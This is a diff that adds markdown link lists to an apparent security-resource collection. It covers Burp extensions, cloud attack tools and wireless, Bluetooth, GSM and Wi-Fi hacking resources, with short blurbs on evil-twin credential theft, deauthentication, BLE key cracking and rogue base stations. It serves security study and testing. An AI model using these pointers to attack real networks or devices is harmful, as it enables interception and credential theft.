+    authorization tests. With the last release now Autorize also perform
+    automatic authentication tests.
+* [backslash-powered-scanner](https://github.com/PortSwigger/backslash-powered-scanner)
+  * This extension complements Burp's active scanner by using a novel approach
+    capable of finding and confirming both known and unknown classes of
+    server-side injection vulnerabilities. Evolved from classic manual
+    techniques, this approach reaps many of the benefits of manual testing
+    including casual WAF evasion, a tiny network footprint, and flexibility in
+    the face of input filtering.
+* [burp-rest-api](https://github.com/vmware/burp-rest-api)
+  * A REST/JSON API to the Burp Suite security tool. Upon successfully building
+    the project, an executable JAR file is created with the Burp Suite
+    Professional JAR bundled in it. When the JAR is launched, it provides a
+    REST/JSON endpoint to access the Scanner, Spider, Proxy and other features
+    of the Burp Suite Professional security tool.
+* [BurpSmartBuster](https://github.com/pathetiq/BurpSmartBuster)
+
+  * Looks for files, directories and file extensions based on current requests
+    received by Burp Suite
+
+* [BurpKit](https://github.com/allfro/BurpKit)
+
+  * BurpKit is a BurpSuite plugin which helps in assessing complex web apps that
+    render the contents of their pages dynamically. It also provides a
+    bi-directional Script bridge API which allows users to create quick one-off
+    BurpSuite plugin prototypes which can interact directly with the DOM and
+    Burp's extender API.
+
+* [BurpSmartBuster](https://github.com/pathetiq/BurpSmartBuster)
+
+  * A Burp Suite content discovery plugin that add the smart into the Buster!
+
+* [collaborator-everywhere](https://github.com/PortSwigger/collaborator-everywhere)
+
+  * A Burp Suite Pro extension which augments your proxy traffic by injecting
+    non-invasive headers designed to reveal backend systems by causing pingbacks
+    to Burp Collaborator
+
+* [C02](https://code.google.com/p/burp-co2/)
+
+  * Co2 includes several useful enhancements bundled into a single Java-based
+    Burp Extension. The extension has it's own configuration tab with multiple
+    sub-tabs (for each Co2 module). Modules that interact with other Burp tools
+    can be disabled from within the Co2 configuration tab, so there is no need
+    to disable the entire extension when using just part of the functionality.
+
+* [distribute-damage](https://github.com/PortSwigger/distribute-damage)
+
+  * Designed to make Burp evenly distribute load across multiple scanner
+    targets, this extension introduces a per-host throttle, and a context menu
+    to trigger scans from. It may also come in useful for avoiding detection.
+
+* [HUNT](https://github.com/bugcrowd/HUNT)
+
+  * HUNT is a Burp Suite extension to: 1. Identify common parameters vulnerable
+    to certain vulnerability classes; 2. Organize testing methodologies inside
+    of Burp Suite;
+
+* [HUNT Burp Suite Extension](https://github.com/bugcrowdlabs/HUNT)
+
+  * HUNT Logo HUNT is a Burp Suite extension to: 1. Identify common parameters
+    vulnerable to certain vulnerability classes. 2. Organize testing
+    methodologies inside of Burp Suite.
+
+* [IntruderPayloads](https://github.com/1N3/IntruderPayloads/blob/master/README.md)
+* [Office Open XML Editor - burp extension](https://github.com/maxence-schmitt/OfficeOpenXMLEditor)
+* [ParrotNG - burp plugin](https://portswigger.net/bappstore/bapps/details/f99325340a404c67a8de2ce593824e0e)
+* [PwnBack](https://github.com/k4ch0w/PwnBack)
+
+  * Burp Extender plugin that generates a sitemap of a website using Wayback
+    Machine
+
+* [SAML Raider](https://github.com/SAMLRaider/SAMLRaider)
+
+  * SAML Raider is a Burp Suite extension for testing SAML infrastructures. It
+    contains two core functionalities: Manipulating SAML Messages and manage
+    X.509 certificates.
+
+* [swurg](https://github.com/AresS31/swurg)
+
+  * Parses Swagger files into the BurpSuite for automating RESTful API testing –
+    approved by Burp for inclusion in their official BApp Store.
+
+### AWS
+
+* Attacking
+
+\*[Gone in 60 Milliseconds - Intrusion and Exfiltration in Server-less Architectures](https://media.ccc.de/v/33c3-7865-gone_in_60_milliseconds)
+
+* More and more businesses are moving away from monolithic servers and turning
+  to event-driven microservices powered by cloud function providers like AWS
+  Lambda. So, how do we hack in to a server that only exists for 60
+  milliseconds? This talk will show novel attack vectors using cloud event
+  sources, exploitabilities in common server-less patterns and frameworks, abuse
+  of undocumented features in AWS Lambda for persistent malware injection,
+  identifying valuable targets for pilfering, and, of course, how to exfiltrate
+  juicy data out of a secure Virtual Private Cloud.
+
+\*[Bucketlist](https://github.com/michenriksen/bucketlist)
+
+* Bucketlist is a quick project I threw together to find and crawl Amazon S3
+  buckets and put all the data into a PostgreSQL database for querying.
+
+_[Penetration Testing AWS Storage: Kicking the S3 Bucket](https://rhinosecuritylabs.com/penetration-testing/penetration-testing-aws-storage/)
+_[AWS pwn](https://github.com/dagrz/aws_pwn)
+
+* This is a collection of horribly written scripts for performing various tasks
+  related to penetration testing AWS. Please don't be sad if it doesn't work for
+  you. It might be that AWS has changed since a given tool was written or it
+  might be that the code sux. Either way, please feel free to contribute. Most
+  of this junk was written by Daniel Grzelak but there's been plenty of
+  contributions, most notably Mike Fuller.
+
+* General
+
+* Securing
+
+* [AWS Security Primer](https://cloudonaut.io/aws-security-primer/#fn:2)
+
+* Tools
+
+* [Scout2](https://github.com/nccgroup/Scout2)
+
+  * Scout2 is a security tool that lets AWS administrators assess their
+    environment's security posture. Using the AWS API, Scout2 gathers
+    configuration data for manual inspection and highlights high-risk areas
+    automatically. Rather than pouring through dozens of pages on the web,
+    Scout2 supplies a clear view of the attack surface automatically.
+
+### Google Compute Cloud/AppEngine
+
+* [Introducing G-Scout](https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2017/august/introducing-g-scout/)
+
+  * G-Scout is a tool to help assess the security of Google Cloud Platform (GCP)
+    environment configurations. By leveraging the Google Cloud API, G-Scout
+    automatically gathers a variety of configuration data and analyzes this data
+    to determine security risks. It produces HTML output.
+
+* [Google Cloud Platform Security Tool](https://github.com/nccgroup/G-Scout)
+* [G-Jacking AppEngine-based applications - HITB2014](https://conference.hitb.org/hitbsecconf2014ams/materials/D2T1-G-Jacking-AppEngine-based-Applications.pdf)
diff --git a/source/Wireless-Networks-And-RF.md b/source/Wireless-Networks-And-RF.md
new file mode 100644
index 0000000..30613b6
--- /dev/null
+++ b/source/Wireless-Networks-And-RF.md
@@ -0,0 +1,701 @@
+# Wireless Networks
+
+### TOC
+
+* [General](#general)
+* [General Software Tools](#generalswt)
+* [Tutorials and Guides](#tut)
+* [Non Tutorial Writeups](#non-tut)
+* [Dongles/HW Tools](#dongles)
+* [Cellular Networks](#cn)
+* [Software Defined Radio](#sdr)
+* [802.11](#80211)
+* [RFID](#rfid)
+* [Zigbee](#zigbee)
+* [Bluetooth](#bt)
+* [Z-Wave](#zwave)
+* [RetroReflectors](#retroreflectors)
+* [Foxhunting & WarDriving](#fxh)
+* [General Blogs/Sites](#gbs)
+* [Talks/Presentations & Videos](#talks)
+* [Papers](#papers)
+* [Miscellaneous](#misc)
+
+### Sort
+
+* [Fix ToC](http://umtrx.org/)
+* [Funtenna - Transmitter: XYZ Embedded device + RF Funtenna Payload](https://www.blackhat.com/docs/us-15/materials/us-15-Cui-Emanate-Like-A-Boss-Generalized-Covert-Data-Exfiltration-With-Funtenna.pdf)
+* [CC1101-FSK](https://github.com/trishmapow/CC1101-FSK)
+
+  * Jam and replay attack on vehicle keyless entry systems.
+
+* [Fluxion](https://github.com/wi-fi-analyzer/fluxion)
+
+  * Fluxion is a remake of linset by vk496 with (hopefully) less bugs and more
+    functionality. It's compatible with the latest release of Kali (rolling).
+    The attack is mostly manual, but experimental versions will automatically
+    handle most functionality from the stable releases.
+
+* [gr-lora](https://github.com/BastilleResearch/gr-lora)
+
+  * This is an open-source implementation of the LoRa CSS PHY, based on the
+    blind signal analysis conducted by @matt-knight. The original research that
+    guided this implementation may be found at
+    https://github.com/matt-knight/research
+
+* [An Auditing Tool for Wi-Fi or Wired Ethernet Connections - Matthew Sullivan](https://www.cookiecadger.com/wp-content/uploads/Cookie%20Cadger.pdf)
+* [gr-nrsc5](https://github.com/argilo/gr-nrsc5)
+
+  * A GNU Radio implementation of HD Radio (NRSC-5)
+
+* [Taming Mr Hayes: Mitigating Signaling Based Attacks on Smartphones](https://www.mulliner.org/collin/academic/publications/mrhayes_mulliner_dsn2012.pdf)
+
+  * Malicious injection of cellular signaling traffic from mobile phones is an
+    emerging security issue. The respective attacks can be performed by hijacked
+    smartphones and by malware resident on mobile phones. Until today there are
+    no protection mechanisms in place to prevent signaling based attacks other
+    than implementing expensive additions to the cellular core network. In this
+    work we present a protection system that resides on the mobile phone. Our
+    solution works by partitioning the phone software stack into the application
+    operating system and the communication partition. The application system is
+    a standard fully featured Android sys tem. On the other side, communication
+    to the cellular network is mediated by a flexible monitoring and enforcement
+    system running on the communication partition. We implemented and evaluated
+    our protection system on a real smartphone. Our evaluation shows that it can
+    mitigate all currently know n signaling based attacks and in addition can
+    protect users fr om cellular Trojans. _ Cellular Networks in Use: _ In use
+    in North America: _ In use in Europe: _ In use in Asia: \_ In use in
+    Africa: \* In use in South America:
+
+### General
+
+* [Cyberspectrum SDR Meetups](https://www.youtube.com/watch?v=MFBkX4CNb08&list=PLPmwwVknVIiXGzKhtimTMjhcyppeRRsnE&index=3)
+* [IEEE 802.11 Tutorial](http://wow.eecs.berkeley.edu/ergen/docs/ieee.pdf)
+
+  * This document describes IEEE 802.11 Wireless Local Area Network (WLAN)
+    Standard. It describes IEEE 802.11 MAC Layer in detail and it briefly
+    mentions IEEE 802.11a, IEEE 802.11b physical layer standard and IEEE 802.11e
+    MAC layer standard
+
+* [FM and Bluetooth and Wifi Oh My Aaron Lafferty - Derbycon7](https://www.youtube.com/watch?v=_yAvPo4pVGA&index=5&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+
+* Articles
+
+* [sysmocom publicly releases Osmocom user manuals](https://www.sysmocom.de/news/sysmocom-publicly-releases-osmocom-user-manuals/)
+
+* Documentation
+
+* [Management Frames Reference Sheet](http://download.aircrack-ng.org/wiki-files/other/managementframes.pdf)
+
+* Educational
+
+* [Guide to Basics of Wireless Networking](http://documentation.netgear.com/reference/fra/wireless/TOC.html)
+* [US Marine Antenna Handbook](http://www.zerobeat.net/r3403c.pdf)
+* [So You Want To Hack Radios - A Primer On Wireless Reverse Engineering](http://conference.hitb.org/hitbsecconf2017ams/materials/D1T4%20-%20Marc%20Newlin%20and%20Matt%20Knight%20-%20So%20You%20Want%20to%20Hack%20Radios.pdf)
+* [PHYs, MACs, and SDRs - Robert Ghilduta](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/17-phys-macs-and-sdrs-robert-ghilduta)
+
+  * The talk will touch on a variety of topics and projects that have been under
+    development including YateBTS, PHYs, MACs, and GNURadio modules. The talk
+    will deal with GSM/LTE/WiFi protocol stacks.
+
+  * [Intro to SDR and RF Signal Analysis](https://www.elttam.com.au/blog/intro-sdr-and-rf-analysis/)
+
+* Testing
+
+* [Introduction to Wireless Security Testing](http://www.grymoire.com/Security/Hardware.html)
+* [RF Testing Methodology - NCCGroup](https://nccgroup.github.io/RFTM/)
+
+  * The RFTM is an Open Source, collaborative testing methodology. It is
+    specifically written in a straightforward way, avoiding mathematics where
+    possible and focussed on providing the information that security researchers
+    and consultants need to know in order to effectively test systems that
+    employ RF technologies.
+
+* [Signals and Modulation](https://nccgroup.github.io/RFTM/basics.html)
+* [Information Sources](https://nccgroup.github.io/RFTM/information_sources.html)
+* [Receiving Signals](https://nccgroup.github.io/RFTM/receiving_signals.html)
+* [Developing an FSK receiver step-by-step](https://nccgroup.github.io/RFTM/fsk_receiver.html)
+* [Transmitting Data](https://nccgroup.github.io/RFTM/transmitting_data.html)
+* [ Developing an FSK transmitter step-by-step](https://nccgroup.github.io/RFTM/fsk_transmitter.html)
+* [Signals Identification](https://nccgroup.github.io/RFTM/signals_identification.html)
+
+* General Videos
+
+* [The Wireless World of the Internet of Things - JP Dunning ".ronin"](http://www.irongeek.com/i.php?page=videos/derbycon4/t214-the-wireless-world-of-the-internet-of-things-jp-dunning-ronin)
+
+  * The Internet of Things brings all the hardware are home together. Most of
+    these devices are controlled through wireless command and control network.
+    But what kind of wireless? And what are the security is in place? This talk
+    with cover the wireless tech used by the Internet of Things and some of the
+    risks to your home or corporate security.
+
+- APCO Project 25 (P25)
+
+- [HOPE Number Nine (2012): Practical Insecurity in Encrypted Radio](https://www.youtube.com/watch?v=7or-_gT8TWU&app=desktop)
+
+  * APCO Project 25 ("P25") is a suite of wireless communications protocols used
+    in the United States and elsewhere for public safety two-way (voice) radio
+    systems. The protocols include security options in which voice and data
+    traffic can be cryptographically protected from eavesdropping. This talk
+    analyzes the security of P25 systems against passive and active adversaries.
+    The panel found a number of protocol, implementation, and user interface
+    weaknesses that routinely leak information to a passive eavesdropper or that
+    permit highly efficient and difficult to detect active attacks. They found
+    new "selective subframe jamming" attacks against P25, in which an active
+    attacker with very modest resources can prevent specific kinds of traffic
+    (such as encrypted messages) from being received, while emitting only a
+    small fraction of the aggregate power of the legitimate transmitter. And,
+    more significantly, they found that even passive attacks represent a serious
+    immediate threat. In an over-the-air analysis conducted over a two year
+    period in several U.S. metropolitan areas, they found that a significant
+    fraction of the "encrypted" P25 tactical radio traffic sent by federal law
+    enforcement surveillance operatives is actually sent in the clear - in spite
+    of their users' belief that they are encrypted - and often reveals such
+    sensitive data as the names of informants in criminal investigations.
+
+### BlueTooth
+
+* General
+
+* [blueborne](https://www.armis.com/blueborne/)
+
+* Testing
+
+* [Bluetooth Penetration Testing Framework - 2011](http://bluetooth-pentest.narod.ru/)
+* [Hacking Bluetooth connections - hackingandsecurity](https://hackingandsecurity.blogspot.com/2017/08/hacking-bluetooth-connections.html?view=timeslide)
+
+* Tools
+
+* [crackle](https://github.com/mikeryan/crackle)
+
+  * cracks BLE Encryption (AKA Bluetooth Smart). crackle exploits a flaw in the
+    BLE pairing process that allows an attacker to guess or very quickly brute
+    force the TK (Temporary Key). With the TK and other data collected from the
+    pairing process, the STK (Short Term Key) and later the LTK (Long Term Key)
+    can be collected.
+
+* [PyBT](https://github.com/mikeryan/PyBT)
+
+  * PyBT is a crappy half implementation of a Bluetooth stack in Python. At the
+    moment it only supports Bluetooth Smart (BLE).
+
+* Writeups
+
+* [Bluetooth NSA Toolset Talk/Attacks video](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/15-the-nsa-playset-bluetooth-smart-attack-tools-mike-ryan)
+* [Getting started with Bluetooth Low Energy on iOS](https://medium.com/@yostane/getting-started-with-bluetooth-low-energy-on-ios-ada3090fc9cc)
+
+### Cellular Networks
+
+* Articles
+
+* [4G LTE Architecture and Security Concerns](http://www.secforce.com/blog/2014/03/4g-lte-architecture-and-security-concerns/)
+
+* Educational
+
+* [Demystifying the Mobile Network by Chuck McAuley](http://2014.video.sector.ca/video/110383258)
+
+  * Must watch video. Very informative.
+
+* [SS7: Locate. Track. Manipulate.[31c3] by Tobias Engel (SnoopSnitch)](https://www.youtube.com/watch?v=lQ0I5tl0YLY)
+* [LTE Security - How good is it?](http://csrc.nist.gov/news_events/cif_2015/research/day2_research_200-250.pdf)
+
+* SIM Cards
+
+* [Rooting Sim Cards](https://media.blackhat.com/us-13/us-13-Nohl-Rooting-SIM-cards-Slides.pdf)
+* [Secrets of Sim](http://www.hackingprojects.net/2013/04/secrets-of-sim.html)
+* [Security mechanisms for the (U)SIM application toolkit; Test specification](https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=1801#)
+* [Small Tweaks do Not Help: Differential Power Analysis of MILENAGE Implementations in 3G/4G USIM Cards](https://www.blackhat.com/docs/us-15/materials/us-15-Yu-Cloning-3G-4G-SIM-Cards-With-A-PC-And-An-Oscilloscope-Lessons-Learned-In-Physical-Security-wp.pdf)
+* [Osmocom SIMtrace](http://bb.osmocom.org/trac/wiki/SIMtrace)
+
+  * Osmocom SIMtrace is a software and hardware system for passively tracing
+    SIM-ME communication between the SIM card and the mobile phone.
+
+* [4G Security: Hacking USB Modem and SIM Card via SMS](http://blog.ptsecurity.com/2014/12/4g-security-hacking-usb-modem-and-sim.html)
+* [The Secret Life of SIM Cards - Defcon21](https://www.youtube.com/watch?v=31D94QOo2gY)
+* [Adventures in Femtoland: 350 Yuan for Invaluable Fun](https://www.slideshare.net/arbitrarycode/adventures-in-femtoland-350-yuan-for-invaluable-fun)
+* [Small Tweaks do Not Help: Differential Power Analysis of MILENAGE Implementations in 3G/4G USIM Cards](https://www.blackhat.com/docs/us-15/materials/us-15-Yu-Cloning-3G-4G-SIM-Cards-With-A-PC-And-An-Oscilloscope-Lessons-Learned-In-Physical-Security-wp.pdf)
+
+### HTMLApplications
+
+* Testing
+
+* [The big GSM write-up; how to capture, analyze and crack GSM?](http://domonkos.tomcsanyi.net/?p=418)
+* [StackOverflow post on intercepting GSM traffic](https://reverseengineering.stackexchange.com/questions/2962/intercepting-gsm-communications-with-an-usrp-and-gnu-radio)
+* [NSA Playset - GSM Sniffing - Pierce&Loki - Defcon22](https://www.youtube.com/watch?v=tnn_qJGh1gc)
+* [Mobile: Cellular Exploitation on a Global Scale The Rise & Fall of the Control](https://www.youtube.com/watch?v=HD1ngJ85vWM)
+* [Sniffing GSM with RTL-SDR](https://www.youtube.com/watch?v=7OW0YOa6CYs)
+* [Capturing and Cracking GSM traffic using a rtl-sdr](https://www.youtube.com/watch?v=TOl4Q4lyJTI)
+
+* Tools
+
+* [Android IMSI-Catcher Detector (AIMSICD)](https://github.com/SecUpwN/Android-IMSI-Catcher-Detector)
+
+  * Android-based project to detect and avoid fake base stations (IMSI-Catchers)
+    in GSM/UMTS Networks.
+
+* [SnoopSnitch](https://opensource.srlabs.de/projects/snoopsnitch)
+
+  * SnoopSnitch is an Android app that collects and analyzes mobile radio data
+    to make you aware of your mobile network security and to warn you about
+    threats like fake base stations (IMSI catchers), user tracking and
+    over-the-air updates. With SnoopSnitch you can use the data collected in the
+    GSM Security Map at gsmmap.org and contribute your own data to GSM Map. This
+    application currently only works on Android phones with a Qualcomm chipset
+    and a stock Android ROM (or a suitable custom ROM with Qualcomm DIAG
+    driver). It requires root priviliges to capture mobile network data.
+
+* [gr-gsm](https://github.com/ptrkrysik/gr-gsm)
+
+  * Gnuradio blocks and tools for receiving GSM transmissions
+
+* Writeups/Talks
+
+* [Mobile self-defense - Karsten Nohl](https://www.youtube.com/watch?v=GeCkO0fWWqc)
+* [SS7: Locate. Track. Manipulate. You have a tracking device in your pocket](http://media.ccc.de/browse/congress/2014/31c3_-_6249_-_en_-_saal_1_-_201412271715_-_ss7_locate_track_manipulate_-_tobias_engel.html#video&t=424)
+
+  * Companies are now selling the ability to track your phone number whereever
+    you go. With a precision of up to 50 meters, detailed movement profiles can
+    be compiled by somebody from the other side of the world without you ever
+    knowing about it. But that is just the tip of the iceberg.
+
+* [LTE Security - How good is it?](http://csrc.nist.gov/news_events/cif_2015/research/day2_research_200-250.pdf)
+* [GSM MAP](http://gsmmap.org/#!/about)
+
+  * The GSM Security Map compares the protection capabilities of mobile
+    networks. Networks are rated in their protection capabilities relative to a
+    reference network that implements all protection measures that have been
+    seen ?in the wild?. The reference is regularly updated to reflect new
+    protection ideas becoming commercially available. Networks, therefore, have
+    to improve continuously to maintain their score, just as hackers are
+    continuously improving their capabilities.
+
+* [The Vodafone Access Gateway / UMTS Femto cell / Vodafone Sure Signal](https://wiki.thc.org/vodafone)
+* [Building a portable GSM BTS using the Nuand bladeRF, Raspberry Pi and YateBTS (The Definitive and Step by Step Guide) ](https://blog.strcpy.info/2016/04/21/building-a-portable-gsm-bts-using-bladerf-raspberry-and-yatebts-the-definitive-guide/)
+* [RTL-SDR Tutorial: Analyzing GSM with Airprobe and Wireshark](http://www.rtl-sdr.com/rtl-sdr-tutorial-analyzing-gsm-with-airprobe-and-wireshark/)
+
+  * The RTL-SDR software defined radio can be used to analyze cellular phone GSM
+    signals, using Linux based tools Airprobe and Wireshark. This tutorial shows
+    how I set up these tools for use with the RTL-SDR.
+
+* [How To Build Your Own Rogue GSM BTS For Fun And Profit](https://www.evilsocket.net/2016/03/31/how-to-build-your-own-rogue-gsm-bts-for-fun-and-profit/)
+* [Sniffing GSM with HackRF](https://web.archive.org/web/20130825000211/http://binaryrf.com/viewtopic.php?t=6&f=9)
+* [GSM/GPRS Traffic Interception for Penetration Testing Engagements](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/may/gsmgprs-traffic-interception-for-penetration-testing-engagements/)
+* [CampZer0 // Domonkos Tomcsányi: GSM - have we overslept the last wake-up call?](https://www.youtube.com/watch?v=3cnnQFP3VqE)
+* [Intercepting GSM Traffic](https://www.blackhat.com/presentations/bh-dc-08/Steve-DHulton/Presentation/bh-dc-08-steve-dhulton.pdf)
+* [GSM: SRSLY?](https://events.ccc.de/congress/2009/Fahrplan/events/3654.en.html)
+
+  * The worlds most popular radio system has over 3 billion handsets in 212
+    countries and not even strong encryption. Perhaps due to cold-war era laws,
+    GSM's security hasn't received the scrutiny it deserves given its
+    popularity. This bothered us enough to take a look; the results were
+    surprising. From the total lack of network to handset authentication, to the
+    "Of course I'll give you my IMSI" message, to the iPhone that really wanted
+    to talk to us. It all came as a surprise ? stunning to see what $1500 of USRP
+    can do. Add a weak cipher trivially breakable after a few months of
+    distributed table generation and you get the most widely deployed privacy
+    threat on the planet. Cloning, spoofing, man-in-the-middle, decrypting,
+    sniffing, crashing, DoS'ing, or just plain having fun. If you can work a
+    BitTorrent client and a standard GNU build process then you can do it all,
+    too. Prepare to change the way you look at your cell phone, forever
+
+* [Wideband GSM Sniffing [27C3]](https://www.youtube.com/watch?v=ZrbatnnRxFc)
+
+  * GSM is still the most widely used security technology in the world with a
+    user base of 5 billion and a quickly growing number of critical
+    applications. 26C3's rainbow table attack on GSM's A5/1 encryption convinced
+    many users that GSM calls should be considered unprotected. The network
+    operators, however, have not woken up to the threat yet. Perhaps the new
+    capabilities to be unleashed this year -- like wide-band sniffing and
+    real-time signal processing -- will wake them up. Now that GSM A5/1
+    encryption can be cracked in seconds, the complexity of wireless phone
+    snooping moved to signal processing. Since GSM hops over a multitude of
+    channels, a large chunk of radio spectrum needs to be analyzed, for example
+    with USRPs, and decoded before storage or decoding. We demonstrate how this
+    high bandwidth task can be achieved with cheap programmable phones.
+
+* [29C3 GSM: Cell phone network review](https://www.youtube.com/watch?v=9wwco24EsHs)
+
+  * Did you notice 262 42 in your mobile phone network search list at the last
+    CCC events? Did you and your friends buy SIM cards at the PoC and help test
+    the network by calling each other, or by calling through the bridge to the
+    DECT network services? Did you ever wonder about the details of this open
+    source test network, set up by a team of volunteers in the middle of the
+    city? We would like to tell you all the details of the cell phone network we
+    operate at 29C3, and show you some fancy graphs based on the network
+    activity! We will describe the process of setting up the test network we
+    operate at 29C3, what legal and technical challenges we have faced, and we
+    will describe the actual installation at the CCH. We will also compare this
+    with the 262 42 test networks that were operated using the same open source
+    software but otherwise very different installations at CCC Camp 2011 and
+    28C3. We will go on to show various statistics that we collect from the
+    network while it has been running.
+
+### Dongles
+
+* [FunCube dongle](http://www.funcubedongle.com)
+* [RZUSBstick](http://www.atmel.com/tools/rzusbstick.aspx)
+
+  * The st arter kit accelerates development, debugging, and demonstration for a
+    wide range of low power wireless applications including IEEE 802.15.4,
+    6LoWPAN, and ZigBee networks. The kit includes one USB stick with a 2.4GHz
+    transceiver and a USB connector. The included AT86RF230 transceiver's high
+    sensitivity supports the longest range for wireless products. The
+    AT90USB1287 incorporates fast USB On-the-Go.
+
+* [Gr0SMoSDR](http://sdr.osmocom.org/trac/wiki/GrOsmoSDR)
+* [PyBOMBS](https://github.com/gnuradio/pybombs)
+
+  * PyBOMBS (Python Build Overlay Managed Bundle System) is the new GNU Radio
+    install management system for resolving dependencies and pulling in
+    out-of-tree projects. One of the main purposes of PyBOMBS is to aggregate
+    out-of-tree projects, which means that PyBOMBS needs to have new recipes for
+    any new project. We have done a lot of the initial work to get known
+    projects into the PyBOMBS system as is, but we will need project developers
+    for new OOT projects or other projects not currently listed to help us out
+    with this effort.
+
+* [UAV Transponders & Tracker Kits - UST](http://www.unmannedsystemstechnology.com/company/sagetech-corporation/)
+
+### Fox Hunting & Wardriving
+
+* [Practical Foxhunting 101](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/04-practical-foxhunting-101-simonj)
+* [iSniff](https://github.com/hubert3/iSniff-GPS)
+
+  * iSniff GPS passively sniffs for SSID probes, ARPs and MDNS (Bonjour) packets
+    broadcast by nearby iPhones, iPads and other wireless devices. The aim is to
+    collect data which can be used to identify each device and determine
+    previous geographical locations, based solely on information each device
+    discloses about previously joined WiFi networks.
+  * iOS devices transmit ARPs which sometimes contain MAC addresses (BSSIDs) of
+    previously joined WiFi networks, as described in [1]. iSniff GPS captures
+    these ARPs and submits MAC addresses to Apple's WiFi location service
+    (masquerading as an iOS device) to obtain GPS coordinates for a given BSSID.
+    If only SSID probes have been captured for a particular device, iSniff GPS
+    can query network names on wigle.net and visualise possible locations.
+
+## 80211 802.11 - WiFi
+
+* Documentation
+
+* [Establishing Wireless Robust Security Networks: A Guide to IEEE 802.11i - NIST](http://csrc.nist.gov/publications/nistpubs/800-97/SP800-97.pdf)
+
+* Educational
+
+* [IEEE 802.11 Tutorial](http://wow.eecs.berkeley.edu/ergen/docs/ieee.pdf)
+
+  * This document describes IEEE 802.11 Wireless Local Area Network (WLAN)
+    Standard. It describes IEEE 802.11 MAC Layer in detail and it briefly
+    mentions IEEE 802.11a, IEEE 802.11b physical layer standard and IEEE 802.11e
+    MAC layer standard
+
+* [Wi-Fi Protected Access 2 (WPA2) Overview](https://technet.microsoft.com/library/bb878054)
+* [Wireless Leakage - Robin Wood](https://digi.ninja/files/Tech_for_Troops-Wi-Fi_Leakage.pdf)
+* Testing
+* [Wireless Pentesting on the Cheap](http://securitysynapse.blogspot.com/2013/12/wireless-pentesting-on-cheap-kali-tl.html)
+
+  * In this article, we proved the capabilities of an inexpensive wireless
+    adapter and a flexible virtualized wireless attack image by breaking into a
+    WEP protected test network. For just $16
+
+* [WPA/WPA2 Dictionaries](https://wifi0wn.wordpress.com/wepwpawpa2-cracking-dictionary/)
+* Tools
+* [Aircrack](https://www.aircrack-ng.org/doku.php?id=links)
+* [SniffAir An Open Source Framework for Wireless Security Assessments Matthew Eidelberg - DerbyCon7](https://www.youtube.com/watch?v=QxVkr-3RK94&app=desktop)
+* [SniffAir](https://github.com/Tylous/SniffAir)
+* [Karma](http://www.theta44.org/karma/)
+* [pixiewps](https://github.com/wiire/pixiewps)
+
+  * Pixiewps is a tool written in C used to bruteforce offline the WPS pin
+    exploiting the low or non-existing entropy of some APs (pixie dust attack).
+    It is meant for educational purposes only. All credits for the research go
+    to Dominique Bongard.
+
+* [eaphammer](https://github.com/s0lst1c3/eaphammer)
+
+  * EAPHammer is a toolkit for performing targeted evil twin attacks against
+    WPA2-Enterprise networks. It is designed to be used in full scope wireless
+    assessments and red team engagements. As such, focus is placed on providing
+    an easy-to-use interface that can be leveraged to execute powerful wireless
+    attacks with minimal manual configuration. To illustrate how fast this tool
+    is, here's an example of how to setup and execute a credential stealing evil
+    twin attack against a WPA2-TTLS network in just two commands:
+
+* [ESP8266 deauther](https://github.com/spacehuhn/esp8266_deauther)
+
+  * Deauthentication attack and other exploits using an ESP8266!
+
+* [probemon](https://github.com/nikharris0/probemon)
+
+  * A simple command line tool for monitoring and logging 802.11 probe frames
+
+* [Infernal-Twin](https://github.com/entropy1337/infernal-twin)
+
+  * This is the tool created to automate Evil Twin attack and capturing public
+    and guest credentials of Access Point
+
+* Writeups
+
+* [Wireless Password Cracking With Cloud Clusters](http://www.commonexploits.com/wireless-password-cracking-with-cloud-clusters/)
+
+* [Exploiting 802.11 Wireless Driver Vulnerabilities on Windows](http://uninformed.org/?v=all&a=29&t=sumry)
+
+  * This paper describes the process of identifying and exploiting 802.11
+    wireless device driver vulnerabilities on Windows. This process is described
+    in terms of two steps: pre-exploitation and exploitation. The
+    pre-exploitation step provides a basic introduction to the 802.11 protocol
+    along with a description of the tools and libraries the authors used to
+    create a basic 802.11 protocol fuzzer. The exploitation step describes the
+    common elements of an 802.11 wireless device driver exploit. These elements
+    include things like the underlying payload architecture that is used when
+    executing arbitrary code in kernel-mode on Windows, how this payload
+    architecture has been integrated into the 3.0 version of the Metasploit
+    Framework, and the interface that the Metasploit Framework exposes to make
+    developing 802.11 wireless device driver exploits easy. Finally, three
+    separate real world wireless device driver vulnerabilities are used as case
+    studies to illustrate the application of this process. It is hoped that the
+    description and illustration of this process can be used to show that
+    kernel-mode vulnerabilities can be just as dangerous and just as easy to
+    exploit as user-mode vulnerabilities. In so doing, awareness of the need for
+    more robust kernel-mode exploit prevention technology can be raised.
+
+* [Fingerprinting 802.11 Implementations via Statistical Analysis of the Duration Field](http://uninformed.org/?v=all&a=23&t=sumry)
+
+  * The research presented in this paper provides the reader with a set of
+    algorithms and techniques that enable the user to remotely determine what
+    chipset and device driver an 802.11 device is using. The technique outlined
+    is entirely passive, and given the amount of features that are being
+    considered for inclusion into the 802.11 standard, seems quite likely that
+    it will increase in precision as the standard marches forward. The
+    implications of this are far ranging. On one hand, the techniques can be
+    used to implement innovative new features in Wireless Intrusion Detection
+    Systems (WIDS). On the other, they can be used to target link layer device
+    driver attacks with much higher precision.
+
+* [Emulation and Exploration of BCM WiFi Frame Parsing using LuaQEMU](https://comsecuris.com/blog/posts/luaqemu_bcm_wifi/)
+* [WPA Migration Mode: WEP is back to haunt you...(slides)](http://dl.aircrack-ng.org/wiki-files/doc/technique_papers/Meiners,_Sor_-_WPA_Migration_Mode_WEP_is_back_to_haunt_you_-_slides.pdf)
+
+  * Migration mode, from Cisco, allows both WEP and WPA clients on the same AP.
+    Besides the fact that the WEP key can be cracked easily, they also bypass
+    the additional security settings offered by Cisco.
+
+* [Predicting, Decrypting, and Abusing WPA2/802.11 Group Keys Mathy Vanhoef and Frank Piessens, Katholieke Universiteit Leuven](https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_vanhoef.pdf)
